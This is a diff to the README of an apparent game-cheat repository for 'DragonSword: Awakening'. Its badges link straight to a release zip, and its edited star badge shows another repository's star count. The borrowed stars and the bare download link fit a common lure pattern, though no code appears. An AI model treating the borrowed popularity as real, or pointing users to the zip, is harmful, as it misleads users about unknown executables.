@@ -4,8 +4,7 @@
 [![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/RaikageDisplay/DragonSword-Awakening-Hack/releases/download/v1/DSAW-V1.zip)
 [![GitHub release](https://img.shields.io/badge/Release-1.1-blue?style=for-the-badge)](https://github.com/RaikageDisplay/DragonSword-Awakening-Hack/releases/download/v1/DSAW-V1.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](https://opensource.org/licenses/MIT)
-[![Stars](https://img.shields.io/github/stars/RaikageDisplay/DragonSword-Awakening-Hack?style=for-the-badge&logo=github)](https://github.com/RaikageDisplay/DragonSword-Awakening-Hack/stargazers)
-[![Stars](https://camo.githubusercontent.com/75a3d3c46a99ce957c3df1911d48d415c3a7ac1a3fec13b4e66856a69a119a81/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f73746172732f4372757368666c616c6561642f447261676f6e53776f72642d4177616b656e696e672d547261696e65723f7374796c653d666f722d7468652d6261646765)](https://github.com/RaikageDisplay/DragonSword-Awakening-Hack/stargazers)
+[![Stars](https://img.shields.io/github/stars/Crushflalead/DragonSword-Awakening-Trainer?style=for-the-badge&logo=github)](https://github.com/RaikageDisplay/DragonSword-Awakening-Hack/stargazers)
 
 
 _A feature-rich in-game cheat menu for DragonSword : Awakening with a clean overlay UI_
@@ -13,7 +12,7 @@ _A feature-rich in-game cheat menu for DragonSword : Awakening with a clean over
 Check the Features list below.
 
 ![1](https://images.mein-mmo.de/medien/2026/07/DragonSword-Awakening-Titel-title-780x438.jpg)
----
+
 
 ## Features
 
